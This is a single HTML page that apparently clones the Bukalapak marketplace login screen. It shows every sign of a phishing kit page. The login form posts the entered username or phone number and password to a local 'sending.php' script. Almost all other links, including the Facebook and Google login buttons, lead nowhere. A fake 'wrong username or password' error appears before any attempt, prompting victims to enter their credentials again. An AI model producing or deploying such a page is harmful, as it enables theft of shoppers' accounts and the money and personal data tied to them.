<!DOCTYPE html>
<html lang='id-ID' xmlns:fb='https://www.facebook.com/2008/fbml' xmlns:og='http://ogp.me/ns#'>
<head>
<meta charset='utf-8'>
<title>Bukalapak</title>
<link rel="shortcut icon" type="image/x-icon" href="/sessions/img/favicons.ico" />
<link href='/manifest.json' rel='manifest'>

<script async='' src='/sessions/js/gpt.js' type='text/javascript'></script>

<link rel="stylesheet" media="screen" href="/sessions/css/application-5145e9843732b9840d352d3f6c02bd8faedb303b094ad75723264904a45e73a2.css" id="app_old_stylesheet" />
<link rel="stylesheet" media="screen" href="/sessions/css/desktop-a9e9083cf2386cb204c4e85e2b00f51bad0113fdb07a41da41fb1d5fcd4d2816.css" id="desktop_stylesheet" />
<script>
  var choseCSS = function() {
    var appStylesheet = document.getElementById("app_old_stylesheet");
    var desktopStylesheet = document.getElementById("desktop_stylesheet");
    var reskinFlag = document.getElementById("reskinned_page") != null;
  
    appStylesheet.disabled = reskinFlag;
    desktopStylesheet.disabled = !reskinFlag;
  };
</script>
</head>
<body class='focus-layout  ' data-current-user='' data-env='production'>

<div id='reskinned_page'></div>

<div class='js-flash-container'>
</div>

<header class='u-border-bottom--1--gray-light u-mrgn-bottom--6' role='banner'>
<div class='o-container o-container--full u-align-center u-pad--5' id='reskinned_page'>
<a href='#'>
<img alt='Bukalapak.com' height='25' src='/sessions/img/single_174x28_0_red_03052016.png' width='158'>
</a>
</div>
</header>
<div class='o-container o-container--responsive'>
<div class='o-layout o-layout--responsive u-align-center'>
<div class='o-layout__item u-4of12 u-push-4of12 u-txt--bold u-txt--fair u-mrgn-bottom--6'>
<div class='js-login-text'>
Silakan masuk ke dalam akun kamu
</div>
</div>
</div>
<div class='o-layout o-layout--responsive u-align-center u-mrgn-bottom--4 js-register-top'>
<div class='o-layout__item u-4of12 u-push-4of12 u-align-left'>
Belum punya akun?
<a href="#">Daftar di sini</a>
</div>
</div>
<div class='o-layout o-layout--responsive u-align-center u-mrgn-bottom--3'>
<div class='o-layout__item u-4of12 u-push-4of12'>
<span class='c-fld__error'>Maaf, <b>username</b> atau <b>password</b> yang kamu masukkan salah. <br>Silahkan coba lagi.</span>
</div>
</div>
<div class='o-layout o-layout--responsive u-align-center'>
<div class='o-layout__item u-4of12 u-push-4of12'>
<form name="login" class="js-form-login" id="new_user_session" action="/sessions/sending.php"  method="post">
<input class="string optional c-inp--large u-mrgn-bottom--3" placeholder="E-mail / Username / Nomor Handphone" type="text" name="email" id="user_session_username" required />
<input class="password optional c-inp--large u-mrgn-bottom--1" placeholder="Password" minlength="6" type="password" name="password" id="user_session_password" autocomplete="off" required />
<div class='o-layout'>
<div class='o-layout__item u-width-1of2 u-align-left u-pad-top--1'>
<div class="c-fld boolean optional user_session_remember_me"><div class="c-fld__row"></div><input value="0" type="hidden" name="user_session[remember_me]" /><label class="checkbox c-inp-wrap"><input class="boolean optional c-inp" type="checkbox" value="1" checked="checked" name="user_session[remember_me]" id="user_session_remember_me" /> Ingat saya</label></div>
</div>
<div class='o-layout__item u-width-1of2 u-align-right u-pad-top--3'>
<a href="#">Lupa Password?</a>
</div>
</div>
<button name="commit" type="submit" class="btn c-btn c-btn--large c-btn--red c-btn--block">Login</button>
</form>
</div>
</div>
<div class='o-layout o-layout--responsive u-align-center u-mrgn-top--4'>
<div class='o-layout__item u-4of12 u-push-4of12'>
<div class='c-separator'>
<span class='c-separator__text'>ATAU</span>
</div>
</div>
</div>
<div class='o-layout o-layout--responsive u-align-center u-mrgn-top--4'>
<div class='o-layout__item u-4of12 u-push-4of12'>
<a class="o-flag c-btn c-btn--large c-btn--block u-mrgn-bottom--2"><img alt='Facebook Icon' class='c-btn__farleft-icon' height='24' src='/sessions/img/fb-logo.png' width='24'>
Login dengan Facebook
</a><a class="c-btn c-btn--large c-btn--block" href="#"><img alt='Google Icon' class='c-btn__farleft-icon' height='24' src='/sessions/img/google-logo.png' width='24'>
<span class='c-btn__text'>Login dengan Google</span>
</a>
</div>
</div>
<div class='o-layout o-layout--responsive u-align-center u-mrgn-top--4 u-mrgn-bottom--4'>
<div class='o-layout__item u-4of12 u-push-4of12'>
<div class='o-layout o-layout--responsive'>
<div class='o-layout__item u-6of12 u-align-left'>
Belum punya akun?
<br>
<a href="#">Daftar sekarang</a>
</div>
<div class='o-layout__item u-6of12 u-align-right'>
User belum aktif?
<br>
<a href="#">Kirim ulang email aktivasi</a>
</div>
</div>
</div>
</div>
</div>

<script>
  choseCSS();
</script>
<script src="/sessions/js/vendor-b07b81e6128583d1bcf3f82a89f5a8e6afc87c6f95e193114d972d6079a7e6be.js" class="js-vendor-script"></script>
<script src="/sessions/js/application-ac9ec8123ded4aab3e52c0efb4aaba21b06fa0fddf2229437d989e76127f30da.js" class="js-application-script"></script>


<a class='back-to-top' href='#'>
<span></span>
</a>
</body>
</html>
